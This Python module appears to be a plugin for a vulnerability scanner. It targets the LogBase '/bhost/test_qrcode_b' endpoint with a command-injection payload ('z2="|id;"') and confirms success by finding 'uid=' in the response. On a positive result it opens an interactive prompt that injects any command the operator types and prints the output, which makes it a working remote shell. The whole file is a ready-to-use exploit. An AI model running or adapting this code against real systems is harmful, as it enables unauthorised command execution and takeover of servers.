#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from libs.reqset import ReqSet
from rich.prompt import Prompt
from libs.output import OutPutFile
urllib3.disable_warnings()
class LogBase_Rce_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/bhost/test_qrcode_b"
            data = 'z1=1&z2="|id;"&z3=bhost'
            headers = {
                "User-Agent":self.headers["User-Agent"],
                "Accept-Encoding": "gzip",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": input_url
            }
            req = requests.post(url,headers=headers,proxies=self.proxy,verify=self.ssl,data=data)
            if "uid=" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("LogBase", '目标存在test_qrcode_b远程命令执行漏洞')
                    OutPrintInfo("LogBase", url)
                else:
                    OutPrintInfoSuc("LogBase", f'目标存在test_qrcode_b远程命令执行漏洞: {url}')
                    OutPutFile("logbase_rce.txt",f'目标test_qrcode_b远程命令执行漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("LogBase", f'目标 {input_url} 不存在test_qrcode_b远程命令执行漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("LogBase",'目标请求出错')
            return False
    def get_url2(self,input_url,cmd):
        try:
            url = input_url + "/bhost/test_qrcode_b"
            data = f'z1=1&z2="|{cmd};"&z3=bhost'
            headers = {
                "User-Agent": self.headers["User-Agent"],
                "Accept-Encoding": "gzip",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": input_url
            }
            req = requests.post(url, headers=headers, proxies=self.proxy, verify=self.ssl, data=data)

            OutPrintInfoSuc("LogBase", f"响应:\n{req.text.strip()}")
        except Exception as e:
            if not self.batch:
                OutPrintInfo("LogBase",'目标请求出错')
            return False



    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("LogBase", '开始检测test_qrcode_b远程命令执行漏洞...')
        if self.get_url(url):
            if not self.batch:
                while True:
                    cmd = Prompt.ask("[b red]CMD")
                    if cmd == "exit":
                        break
                    self.get_url2(url,cmd)


        if not self.batch:
            OutPrintInfo("LogBase", 'test_qrcode_b远程命令执行漏洞检测结束')



